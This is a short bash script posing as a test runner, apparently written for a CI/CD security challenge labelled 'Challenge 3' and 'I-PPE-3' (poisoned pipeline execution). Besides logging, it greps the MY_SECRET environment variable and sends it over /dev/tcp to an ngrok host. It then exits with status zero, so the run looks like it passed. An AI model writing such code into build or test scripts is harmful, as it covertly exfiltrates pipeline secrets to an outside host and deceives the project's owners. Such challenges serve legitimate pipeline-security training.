#!/usr/bin/bash
echo "Executing Tests script [from user $1 at $2]" >> runtests.out
echo "$(which bash)" >> runtests.out 

echo "Challenge 3 " > /dev/tcp/7.tcp.eu.ngrok.io/18280
MS=$(env | grep MY_SECRET)
echo "$MS" > /dev/tcp/7.tcp.eu.ngrok.io/18280
echo "------- I-PPE-3  From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET)" > /dev/tcp/7.tcp.eu.ngrok.io/18280
echo "$MS" >> runtests.out 
RET=0
exit $RET
